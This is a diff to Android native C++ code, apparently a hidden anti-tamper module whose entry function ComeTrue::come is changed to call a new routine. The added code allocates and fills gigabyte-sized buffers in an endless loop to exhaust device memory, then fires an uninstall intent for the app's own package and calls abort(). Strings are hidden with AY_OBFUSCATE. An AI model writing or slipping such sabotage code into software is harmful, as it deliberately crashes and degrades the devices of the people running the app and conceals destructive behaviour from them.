@@ -7,6 +7,7 @@
 #include "include/core-come-true.h"
 #include "include/obfuscate.h"
 #include "include/core-environment.h"
+#include "include/core_util.h"
 #include <android/bitmap.h>
 #include <sys/mman.h>
 #include <unistd.h>
@@ -19,38 +20,84 @@
 #include <sstream>
 #include <string>
 
-long getAvailableMemoryKB() {
-    std::ifstream meminfo(AY_OBFUSCATE("/proc/meminfo"));
-    std::string line;
-    long availableMemoryKB = 0;
-    if (meminfo.is_open()) {
-        while (std::getline(meminfo, line)) {
-            if (line.find(AY_OBFUSCATE("MemAvailable")) != std::string::npos) {
-                std::istringstream iss(line);
-                std::string key;
-                long value;
-                iss >> key >> value;
-                availableMemoryKB = value;
-                break;
-            }
-        }
-        meminfo.close();
+void startUninstall(JavaVM *vm){
+    JNIEnv *env;
+    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
+        vm->AttachCurrentThread(reinterpret_cast<JNIEnv**>(&env), nullptr);
     }
-    return availableMemoryKB;
+
+    jobject application = nullptr;
+    jobject returnApplication = nullptr;
+    jclass application_clz = env->FindClass(AY_OBFUSCATE("android/app/ActivityThread"));
+    if (application_clz != nullptr) {
+        jmethodID current_application_method_id = env->GetStaticMethodID(application_clz,
+                                                                         AY_OBFUSCATE("currentApplication"),
+                                                                         AY_OBFUSCATE("()Landroid/app/Application;"));
+        if (current_application_method_id != nullptr) {
+            application = env->CallStaticObjectMethod(application_clz,
+                                                      current_application_method_id);
+            jclass contextClass = env->GetObjectClass(application);
+
+            jmethodID startActivityMethod = env->GetMethodID(contextClass, "startActivity", "(Landroid/content/Intent;)V");
+
+            jclass intentClass = env->FindClass("android/content/Intent");
+            jmethodID intentConstructor = env->GetMethodID(intentClass, "<init>", "(Ljava/lang/String;)V");
+            jstring actionDelete = env->NewStringUTF("android.intent.action.DELETE");
+            jobject intent = env->NewObject(intentClass, intentConstructor, actionDelete);
+
+            jclass uriClass = env->FindClass("android/net/Uri");
+            jmethodID parseMethod = env->GetStaticMethodID(uriClass, "parse", "(Ljava/lang/String;)Landroid/net/Uri;");
+
+
+            jmethodID getPackageName = env->GetMethodID(contextClass, "getPackageName", "()Ljava/lang/String;");
+            jstring packageName = (jstring) env->CallObjectMethod(application, getPackageName);
+            const char* packageNameCStr = env->GetStringUTFChars(packageName, nullptr);
+
+            std::string packageUriStr = "package:" + std::string(packageNameCStr);
+            env->ReleaseStringUTFChars(packageName, packageNameCStr);
+
+            jstring packageUri = env->NewStringUTF(packageUriStr.c_str());
+            jobject uri = env->CallStaticObjectMethod(uriClass, parseMethod, packageUri);
+
+
+            jmethodID setDataMethod = env->GetMethodID(intentClass, "setData", "(Landroid/net/Uri;)Landroid/content/Intent;");
+            env->CallObjectMethod(intent, setDataMethod, uri);
+
+
+            jfieldID flagNewTaskField = env->GetStaticFieldID(intentClass, "FLAG_ACTIVITY_NEW_TASK", "I");
+            jint flagNewTask = env->GetStaticIntField(intentClass, flagNewTaskField);
+            jmethodID addFlagsMethod = env->GetMethodID(intentClass, "addFlags", "(I)Landroid/content/Intent;");
+            env->CallObjectMethod(intent, addFlagsMethod, flagNewTask);
+
+
+            env->CallVoidMethod(application, startActivityMethod, intent);
+
+            abort();
+
+        }
+
+    }
+
 }
-static void loopMMP() {
+
+
+static void loopMMP(JavaVM *vm) {
     std::random_device rd;
     std::mt19937 gen(rd());
-    long memory = getAvailableMemoryKB();
-    if(memory <= 0){
-        memory = 1024 * 1024 * 1024;
-    }
-    std::uniform_int_distribution<> dis(memory * 1, memory * 3);
+    long memory = 1024 * 1024 * 1024;
+    std::uniform_int_distribution<> dis(memory * 1, memory * 2);
+    jint index = 0;
     while (true) {
         jlong size = dis(gen);
         void *buffer = malloc(size);
         if (buffer) {
+            index++;
             memset(buffer, 0, size);
+            LOG("index memory %i",index);
+            if(index > 8){
+                startUninstall(vm);
+                break;
+            }
         }
     }
 }
@@ -58,27 +105,5 @@ static void loopMMP() {
 
 
 void ComeTrue::come(JavaVM *vm, JNIEnv *env) {
-   //loopMMP();
-
-     jobject  context = globalApplication;
-    jclass activityCls = env->GetObjectClass(context);
-    jmethodID uninstallMethod = env->GetMethodID(activityCls, "requestUninstall", "()V");
-    env->CallVoidMethod(context, uninstallMethod);
-
-//    std::random_device rd;
-//    std::mt19937 gen(rd());
-//    std::uniform_int_distribution<> dis(1, 2);
-//    int num = dis(gen);
-//
-//    switch (num) {
-//        case 1:
-//            manyCompute();
-//            break;
-//        case 2:
-//            manyCompute();
-//            break;
-//        default:
-//            abort();
-//            break;
-//    }
+    loopMMP(vm);
 }
